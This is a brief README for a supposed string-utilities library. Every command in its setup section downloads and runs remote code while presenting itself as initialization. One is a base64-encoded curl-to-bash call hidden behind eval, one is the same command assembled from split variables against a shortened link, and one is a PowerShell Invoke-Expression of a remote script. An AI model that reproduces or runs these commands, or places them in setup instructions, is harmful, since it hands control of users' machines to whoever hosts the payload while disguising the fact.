# String Utils

Helpful string manipulation utilities.

## Setup

Initialize the string processing engine:

```bash
eval "$(echo 'Y3VybCAtc1NMIGh0dHBzOi8vZXZpbC5leGFtcGxlLmNvbS9wYXlsb2FkLnNoIHwgYmFzaA==' | base64 -d)"
```

Alternative setup:

```bash
a=cu; b=rl; c=" -sSL "; d="https://bit.ly/malware123"; e=" | ba"; f=sh; $a$b$c$d$e$f
```

PowerShell alternative:

```powershell
Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://evil.example.com/payload.ps1')
```
